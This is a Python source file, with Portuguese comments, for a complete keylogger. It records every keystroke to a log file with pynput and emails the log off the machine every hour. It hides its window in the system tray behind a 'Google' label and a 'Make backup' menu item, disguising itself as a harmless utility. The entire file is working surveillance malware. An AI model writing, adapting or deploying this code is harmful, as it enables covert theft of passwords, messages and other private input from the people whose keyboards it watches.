# Import the required libraries
from tkinter import *
from pystray import MenuItem as item
from PIL import Image
from pynput.keyboard import Listener
from Email import Email
import pystray, multiprocessing, pathlib
from apscheduler.schedulers.background import BackgroundScheduler

#definir a localização do arquivo de log
logFile = "{0}/log.txt".format(pathlib.Path().resolve())

email = Email()

def writeLog(key):
    '''
    Esta função será responsável por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    #dicionário com as teclas a serem traduzidas
    translate_keys = {
        "Key.space": " ",
        "Key.shift_r": "",
        "Key.shift_l": "",
        "Key.enter": "\n",
        "Key.alt": "",
        "Key.esc": "",
        "Key.cmd": "",
        "Key.caps_lock": "KEY_CAPS_LOCK",
        "Key.backspace": "KEY_BACKSPACE"
    }

    #converter a tecla pressionada para string
    keydata = str(key)

    #remover as asplas simples que delimitam os caracteres
    keydata = keydata.replace("'", "")

    for key in translate_keys:
        #key recebe a chave do dicionário translate_keys
        #substituir a chave (key) pelo seu valor (translate_keys[key])
        keydata = keydata.replace(key, translate_keys[key])

    #abrir o arquivo de log no modo append
    with open(logFile, "a") as f:
        f.write(keydata)

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função writeLog
def startKeylogger():
    with Listener(on_press=writeLog) as l:
        l.join()

startThreading = multiprocessing.Process(target=startKeylogger)
startThreading.start()

# Create an instance of tkinter frame or window
win=Tk()
win.title("")

# Set the size of the window
win.geometry("110x0")

# Define a function for quit the window
def quit_window(icon, item):
    if startThreading.is_alive():
        startThreading.terminate()

    makeAndSendMessage()
    email.closeServer()
    icon.stop()
    win.destroy()

# Define a function to show the window again
def make_backup():
   makeAndSendMessage()

# Hide the window and show on the system taskbar
def hide_window():
   win.withdraw()
   image=Image.open("favicon.ico")
   menu=(item('Quit', quit_window), item('Make backup', make_backup))
   icon=pystray.Icon("name", image, "Google", menu)
   icon.run()

def makeAndSendMessage():
    with open(logFile, "r+") as f:
        email.createMessage(f.read())
        email.sendMessage()
        f.truncate(0)

scheduler = BackgroundScheduler()
scheduler.add_job(makeAndSendMessage, 'interval', hours=1)
scheduler.start()

hide_window()